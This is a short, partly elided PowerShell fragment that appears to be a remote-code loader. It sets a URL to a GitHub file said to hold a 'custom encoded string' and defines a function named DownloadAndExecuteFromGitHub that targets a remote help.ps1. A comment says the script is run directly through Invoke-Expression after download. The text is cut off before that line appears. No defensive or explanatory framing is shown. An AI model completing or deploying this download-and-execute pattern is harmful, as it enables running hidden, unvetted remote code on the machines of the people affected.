...
$url = "https://raw.githubusercontent.com/notforuseactually/404/main/3.txt" # Replace this with the actual URL containing the custom encoded string
...
Function DownloadAndExecuteFromGitHub {
    # Define the URL of the .ps1 file on GitHub
    $scriptUrl = "https://github.com/notforuseactually/404/blob/main/help.ps1"
    
    # Use Invoke-Expression to execute the script directly after downloading
